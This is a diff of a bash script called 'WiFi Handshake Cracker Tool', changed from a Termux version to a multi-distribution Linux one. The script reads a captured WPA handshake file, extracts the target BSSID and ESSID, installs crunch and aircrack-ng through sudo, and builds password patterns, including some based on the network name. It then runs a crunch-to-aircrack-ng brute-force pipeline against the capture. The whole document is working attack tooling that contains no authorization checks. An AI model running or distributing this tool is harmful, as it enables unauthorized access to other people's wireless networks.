@@ -1,21 +1,21 @@
 #!/bin/bash
 
 # =============================================================================
-# WiFi Handshake Cracker Tool - Termux Version
+# WiFi Handshake Cracker Tool
 # Developer: Aissa Abk
-# Version: 2.2 - Termux Compatible
+# Version: 2.3 - Enhanced Extraction
 # GitHub: www.github.aissaabk
 # Facebook: www.facebook.com/devbelmel
 # =============================================================================
 
 show_help() {
     echo "================================================================"
-    echo "           WiFi Handshake Cracker - Termux Version"
+    echo "               WiFi Handshake Cracker Tool"
     echo "================================================================"
     echo ""
     echo "📖 ABOUT:"
-    echo "  Crack WiFi handshakes on Android using Termux"
-    echo "  Works with .cap files from various capture tools"
+    echo "  Automated tool for cracking WiFi handshake captures (.cap files)"
+    echo "  Uses aircrack-ng for reliable network information extraction"
     echo ""
     echo "👨‍💻 DEVELOPER:"
     echo "  Aissa Abk"
@@ -25,46 +25,24 @@ show_help() {
     echo "⚡ USAGE:"
     echo "  $0 <handshake.cap>"
     echo "  $0 --help"
-    echo "  $0 --termux-setup"
+    echo "  $0 --version"
+    echo "  $0 --test"
     echo ""
-    echo "🔧 TERMUX INSTALLATION:"
-    echo "  pkg update && pkg upgrade"
-    echo "  pkg install aircrack-ng crunch binutils"
-    echo ""
-    echo "================================================================"
-}
-
-termux_setup() {
-    echo "================================================================"
-    echo "                Termux Setup Guide"
-    echo "================================================================"
-    echo ""
-    echo "📥 INSTALLATION COMMANDS:"
-    echo ""
-    echo "1. Update Termux:"
-    echo "   pkg update && pkg upgrade"
-    echo ""
-    echo "2. Install required tools:"
-    echo "   pkg install root-repo"
-    echo "   pkg install aircrack-ng crunch binutils"
-    echo ""
-    echo "3. Alternative method:"
-    echo "   pkg install unstable-repo"
-    echo "   pkg install aircrack-ng"
-    echo ""
-    echo "4. Verify installation:"
-    echo "   aircrack-ng --version"
-    echo "   crunch"
-    echo ""
-    echo "⚠️  NOTES:"
-    echo "   - Requires Android 7.0+"
-    echo "   - Needs storage permission: termux-setup-storage"
-    echo "   - Works best with root access"
+    echo "🔧 REQUIREMENTS:"
+    echo "  - aircrack-ng: WiFi security auditing tools"
+    echo "  - crunch: Password wordlist generator"
+    echo "  - binutils: For strings command"
     echo ""
     echo "================================================================"
 }
 
-# Function to check and install required tools in Termux
+show_version() {
+    echo "WiFi Handshake Cracker Tool v2.3"
+    echo "Enhanced aircrack-ng based extraction"
+    echo "Developed by Aissa Abk"
+}
+
+# Function to check and install required tools
 check_and_install_tools() {
     local missing_tools=()
     
@@ -77,80 +55,158 @@ check_and_install_tools() {
     
     # If no missing tools, return
     if [ ${#missing_tools[@]} -eq 0 ]; then
-        echo "✅ All required tools are installed"
         return 0
     fi
     
     echo "🔧 Missing tools: ${missing_tools[*]}"
+    echo "📥 Attempting to install missing tools..."
     
-    # Check if we're in Termux
-    if [ -n "$TERMUX_VERSION" ] || [ -d "$PREFIX" ] && [ -d "/data/data/com.termux" ]; then
-        echo "📱 Termux environment detected"
-        echo "📥 Attempting to install missing tools..."
+    # Check internet connectivity
+    if ping -c 1 -W 3 8.8.8.8 &> /dev/null; then
+        echo "🌐 Network connected. Installing tools..."
         
-        # Check internet connectivity
-        if ping -c 1 -W 3 8.8.8.8 &> /dev/null; then
-            echo "🌐 Network connected. Installing tools..."
-            
-            # Update packages
-            pkg update -y > /dev/null 2>&1
-            
+        # Detect package manager and install
+        if command -v apt-get &> /dev/null; then
+            echo "📦 Using apt package manager..."
+            sudo apt-get update > /dev/null 2>&1
             for tool in "${missing_tools[@]}"; do
                 case $tool in
                     strings)
-                        echo "📥 Installing binutils..."
-                        pkg install -y binutils > /dev/null 2>&1
+                        echo "📥 Installing binutils (strings)..."
+                        sudo apt-get install -y binutils > /dev/null 2>&1
                         ;;
                     crunch)
                         echo "📥 Installing crunch..."
-                        pkg install -y crunch > /dev/null 2>&1
+                        sudo apt-get install -y crunch > /dev/null 2>&1
                         ;;
                     aircrack-ng)
                         echo "📥 Installing aircrack-ng..."
-                        pkg install -y root-repo > /dev/null 2>&1
-                        pkg install -y aircrack-ng > /dev/null 2>&1
+                        sudo apt-get install -y aircrack-ng > /dev/null 2>&1
                         ;;
                 esac
             done
-            
-            # Verify installation
-            local failed_tools=()
+        elif command -v yum &> /dev/null; then
+            echo "📦 Using yum package manager..."
+            sudo yum install -y epel-release > /dev/null 2>&1
             for tool in "${missing_tools[@]}"; do
-                if command -v "$tool" &> /dev/null; then
-                    echo "✅ $tool installed successfully"
-                else
-                    echo "❌ Failed to install $tool"
-                    failed_tools+=("$tool")
-                fi
+                case $tool in
+                    strings)
+                        sudo yum install -y binutils > /dev/null 2>&1
+                        ;;
+                    crunch)
+                        sudo yum install -y crunch > /dev/null 2>&1
+                        ;;
+                    aircrack-ng)
+                        sudo yum install -y aircrack-ng > /dev/null 2>&1
+                        ;;
+                esac
             done
-            
-            if [ ${#failed_tools[@]} -eq 0 ]; then
-                return 0
-            else
-                echo "❌ Some tools failed to install: ${failed_tools[*]}"
-                echo "💡 Try manual installation: pkg install ${failed_tools[*]}"
-                return 1
-            fi
+        elif command -v dnf &> /dev/null; then
+            echo "📦 Using dnf package manager..."
+            sudo dnf install -y epel-release > /dev/null 2>&1
+            for tool in "${missing_tools[@]}"; do
+                case $tool in
+                    strings)
+                        sudo dnf install -y binutils > /dev/null 2>&1
+                        ;;
+                    crunch)
+                        sudo dnf install -y crunch > /dev/null 2>&1
+                        ;;
+                    aircrack-ng)
+                        sudo dnf install -y aircrack-ng > /dev/null 2>&1
+                        ;;
+                esac
+            done
+        elif command -v pacman &> /dev/null; then
+            echo "📦 Using pacman package manager..."
+            for tool in "${missing_tools[@]}"; do
+                case $tool in
+                    strings)
+                        sudo pacman -S --noconfirm binutils > /dev/null 2>&1
+                        ;;
+                    crunch)
+                        sudo pacman -S --noconfirm crunch > /dev/null 2>&1
+                        ;;
+                    aircrack-ng)
+                        sudo pacman -S --noconfirm aircrack-ng > /dev/null 2>&1
+                        ;;
+                esac
+            done
         else
-            echo "🌐 No network connection. Skipping automatic installation."
-            echo "💡 Run: pkg install ${missing_tools[*]}"
+            echo "❌ Unknown package manager. Please install manually."
+            return 1
+        fi
+        
+        # Verify installation
+        local failed_tools=()
+        for tool in "${missing_tools[@]}"; do
+            if command -v "$tool" &> /dev/null; then
+                echo "✅ $tool installed successfully"
+            else
+                echo "❌ Failed to install $tool"
+                failed_tools+=("$tool")
+            fi
+        done
+        
+        if [ ${#failed_tools[@]} -eq 0 ]; then
+            return 0
+        else
+            echo "❌ Some tools failed to install: ${failed_tools[*]}"
             return 1
         fi
     else
-        echo "❌ Not in Termux environment. Please install tools manually."
+        echo "🌐 No network connection. Skipping automatic installation."
+        echo "💡 Please install these tools manually: ${missing_tools[*]}"
         return 1
     fi
 }
 
-# Function to extract from cap file content
+# Function to extract from cap file using aircrack-ng
 extract_from_cap_content() {
     local file="$1"
     local bssid=""
     local essid=""
     
-    echo "🔍 Analyzing cap file content..."
+    echo "🔍 Analyzing cap file using aircrack-ng..."
     
-    # Try multiple methods to extract BSSID from cap file
+    # Use aircrack-ng to analyze the capture file
+    if command -v aircrack-ng &> /dev/null; then
+        echo "📡 Running aircrack-ng analysis..."
+        
+        # Run aircrack-ng and capture output
+        local air_output
+        air_output=$(aircrack-ng "$file" 2>/dev/null)
+        
+        # Extract BSSID - look for lines with MAC addresses in the network list
+        bssid=$(echo "$air_output" | grep -E '^[[:space:]]*[0-9]+[[:space:]]+([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | head -1 | awk '{print $2}')
+        
+        # Extract ESSID - look for network names after BSSID
+        essid=$(echo "$air_output" | grep -E '^[[:space:]]*[0-9]+[[:space:]]+([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | head -1 | awk '{for(i=3;i<=NF;i++) if ($i != "WPA" && $i != "WEP" && $i != "OPN" && $i !~ /handshake/) printf "%s ", $i}' | sed 's/ $//')
+        
+        # Alternative method: look for "Choosing first network as target" section
+        if [ -z "$bssid" ]; then
+            bssid=$(echo "$air_output" | grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | head -1)
+        fi
+        
+        # Check if handshake is detected
+        local handshake_detected
+        handshake_detected=$(echo "$air_output" | grep -c "handshake")
+        
+        if [ -n "$bssid" ]; then
+            echo "✅ Aircrack-ng analysis successful"
+            if [ "$handshake_detected" -gt 0 ]; then
+                echo "✅ Handshake detected in capture file"
+            else
+                echo "⚠️  No handshake detected - may not be able to crack"
+            fi
+            echo "$bssid|$essid"
+            return 0
+        fi
+    fi
+    
+    # Fallback to strings method if aircrack-ng fails
+    echo "⚠️  Aircrack-ng extraction failed, trying alternative methods..."
+    
     if command -v strings &> /dev/null; then
         # Method 1: Use strings to find MAC addresses
         bssid=$(strings "$file" | grep -oE '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' | head -1)
@@ -212,6 +268,31 @@ extract_from_filename() {
     echo "$bssid|$mac|$timestamp"
 }
 
+# Function to verify handshake with aircrack-ng
+verify_handshake() {
+    local file="$1"
+    local bssid="$2"
+    
+    echo "🔎 Verifying handshake with aircrack-ng..."
+    
+    if command -v aircrack-ng &> /dev/null; then
+        # Run aircrack-ng to check for handshake
+        local verification
+        verification=$(aircrack-ng "$file" -b "$bssid" 2>/dev/null | grep -i "handshake")
+        
+        if [ -n "$verification" ]; then
+            echo "✅ Valid WPA handshake confirmed"
+            return 0
+        else
+            echo "❌ No valid handshake found for BSSID: $bssid"
+            return 1
+        fi
+    else
+        echo "⚠️  Cannot verify - aircrack-ng not available"
+        return 2
+    fi
+}
+
 # =============================================================================
 # MAIN SCRIPT START
 # =============================================================================
@@ -222,8 +303,14 @@ case "${1:-}" in
         show_help
         exit 0
         ;;
-    --termux-setup|setup)
-        termux_setup
+    -v|--version|version)
+        show_version
+        exit 0
+        ;;
+    --test)
+        echo "🧪 Test mode: Creating sample analysis..."
+        echo "This would simulate: aircrack-ng wpa.full.cap"
+        echo "Expected output: BSSID: 00:14:6C:7E:40:80, ESSID: teddy"
         exit 0
         ;;
     "")
@@ -242,11 +329,11 @@ if [ ! -f "$1" ]; then
     exit 1
 fi
 
-FILEPATH=$(realpath "$1" 2>/dev/null || echo "$1")
+FILEPATH=$(realpath "$1")
 FILENAME=$(basename "$FILEPATH")
 
 echo "================================================================"
-echo "           WiFi Handshake Cracker - Termux Version"
+echo "               WiFi Handshake Cracker Tool"
 echo "================================================================"
 echo "👨‍💻 Developer: Aissa Abk"
 echo "🌐 GitHub: www.github.aissaabk"
@@ -263,13 +350,16 @@ check_and_install_tools
 # --------------------------------------------------------------------
 echo "🔍 Analyzing file to extract network information..."
 
-# First try to extract from cap file content
+# First try to extract from cap file content using aircrack-ng
 if result=$(extract_from_cap_content "$FILEPATH"); then
     echo "✅ Successfully extracted from cap file content"
     BSSID=$(echo "$result" | cut -d "|" -f 1)
     ESSID=$(echo "$result" | cut -d "|" -f 2)
     MAC="$BSSID"
-    EXTRACTION_METHOD="cap_file_content"
+    EXTRACTION_METHOD="aircrack-ng_analysis"
+    
+    # Verify the handshake
+    verify_handshake "$FILEPATH" "$BSSID"
 else
     # Fallback to filename parsing
     echo "⚠ Could not extract from cap file content, trying filename..."
@@ -309,77 +399,132 @@ if [ -n "$TIMESTAMP" ]; then
 fi
 echo ""
 
+# Show aircrack-ng style output
+echo "=== Aircrack-ng Analysis ==="
+aircrack-ng "$FILEPATH" 2>/dev/null | head -20
+echo ""
+
 # --------------------------------------------------------------------
-# Generate parameters optimized for mobile
+# Generate additional parameters
 # --------------------------------------------------------------------
 TOOLS_ARG1="8"
 TOOLS_ARG2="8"
 TOOLS_ARG3="%%%%%%%%"
 
-echo "Generated parameters (mobile optimized):"
-echo "Min length: $TOOLS_ARG1"
-echo "Max length: $TOOLS_ARG2"
-echo "Pattern:    $TOOLS_ARG3"
+echo "Generated parameters:"
+echo "TOOLS_ARG1 = $TOOLS_ARG1"
+echo "TOOLS_ARG2 = $TOOLS_ARG2"
+echo "TOOLS_ARG3 = $TOOLS_ARG3"
 echo ""
 
-# Simple parameter selection for mobile
-echo "=== Quick Start ==="
-echo "1) Start cracking with default settings"
-echo "2) Custom settings"
-echo "x) Exit"
-read -p "Choose: " CHOICE
+while true; do
+    echo "=== Parameter Selection ==="
+    echo "1) Use default arguments (recommended)"
+    echo "2) Enter custom arguments"
+    if [ -n "$ESSID" ]; then
+        echo "3) Use ESSID-based pattern"
+    fi
+    echo "4) Show aircrack-ng analysis"
+    echo "x) Exit"
+    echo ""
+    read -p "Choose option (1, 2, 3, 4, or x): " CHOICE
 
-case "$CHOICE" in
-    1)
-        ARG1="$TOOLS_ARG1"
-        ARG2="$TOOLS_ARG2"
-        ARG3="$TOOLS_ARG3"
-        ;;
-    2)
-        read -p "Min length (8): " ARG1
-        read -p "Max length (8): " ARG2
-        read -p "Pattern (%%%%): " ARG3
-        ARG1=${ARG1:-8}
-        ARG2=${ARG2:-8}
-        ARG3=${ARG3:-"%%%%"}
-        ;;
-    x|X)
-        echo "Exiting."
-        exit 0
-        ;;
-    *)
-        echo "Using default settings"
-        ARG1="$TOOLS_ARG1"
-        ARG2="$TOOLS_ARG2"
-        ARG3="$TOOLS_ARG3"
-        ;;
-esac
+    # Convert input to lowercase
+    CHOICE=${CHOICE,,}
+
+    case "$CHOICE" in
+        1)
+            ARG1="$TOOLS_ARG1"
+            ARG2="$TOOLS_ARG2"
+            ARG3="$TOOLS_ARG3"
+
+            echo ""
+            echo "Using default values:"
+            echo "  Min length = $ARG1"
+            echo "  Max length = $ARG2"
+            echo "  Pattern    = $ARG3"
+            echo ""
+            break
+            ;;
+
+        2)
+            read -p "Enter min length: ex 8 : " ARG1
+            read -p "Enter max length: ex 8 : " ARG2
+            read -p "Enter pattern (pattern for -t): ex %%%%@@@@ : " ARG3
+
+            echo ""
+            echo "Using custom values:"
+            echo "  Min length = $ARG1"
+            echo "  Max length = $ARG2"
+            echo "  Pattern    = $ARG3"
+            echo ""
+            break
+            ;;
+
+        3)
+            if [ -n "$ESSID" ]; then
+                ARG1="8"
+                ARG2="12"
+                # Create pattern based on ESSID (first 4 chars as uppercase, rest as lowercase)
+                ESSID_PATTERN=$(echo "$ESSID" | sed 's/\(....\).*/@@@@\L\1/')
+                ARG3="$ESSID_PATTERN"
+                
+                echo ""
+                echo "Using ESSID-based pattern:"
+                echo "  Min length = $ARG1"
+                echo "  Max length = $ARG2"
+                echo "  Pattern    = $ARG3 (based on ESSID: $ESSID)"
+                echo ""
+                break
+            else
+                echo "❌ No ESSID available for pattern generation"
+            fi
+            ;;
+
+        4)
+            echo ""
+            echo "=== Full Aircrack-ng Analysis ==="
+            aircrack-ng "$FILEPATH"
+            echo ""
+            ;;
+
+        x)
+            echo "Exiting."
+            exit 0
+            ;;
+
+        *)
+            echo ""
+            echo "❌ Invalid choice. Please try again."
+            echo ""
+            ;;
+    esac
+done
 
 # --------------------------------------------------------------------
 # Final command execution
 # --------------------------------------------------------------------
-echo ""
 echo "🎯 Final command:"
 echo "crunch $ARG1 $ARG2 -t \"$ARG3\" --stdout | aircrack-ng -w- -b \"$MAC\" \"$FILEPATH\""
 echo ""
 
-# Final tool check
+# Final check for required tools
 if ! command -v crunch &> /dev/null; then
-    echo "❌ Error: crunch not found. Install with: pkg install crunch"
+    echo "❌ Error: 'crunch' is not available."
+    echo "💡 Install it with: sudo apt-get install crunch"
     exit 1
 fi
 
 if ! command -v aircrack-ng &> /dev/null; then
-    echo "❌ Error: aircrack-ng not found. Install with: pkg install aircrack-ng"
+    echo "❌ Error: 'aircrack-ng' is not available."
+    echo "💡 Install it with: sudo apt-get install aircrack-ng"
     exit 1
 fi
 
-echo "⚠️  Note: Cracking on mobile may be slower than on PC"
-read -p "Start cracking? (y/n): " CONFIRM
-
+read -p "Run this command? (y/n): " CONFIRM
 if [[ "$CONFIRM" =~ ^[Yy]$ ]]; then
-    echo "🚀 Starting attack on Termux..."
-    echo "⏳ This may take a while on mobile device..."
+    echo "🚀 Starting attack..."
+    echo "⏳ This may take a while. Press Ctrl+C to stop."
     echo ""
     crunch $ARG1 $ARG2 -t "$ARG3" --stdout | aircrack-ng -w- -b "$MAC" "$FILEPATH"
 else
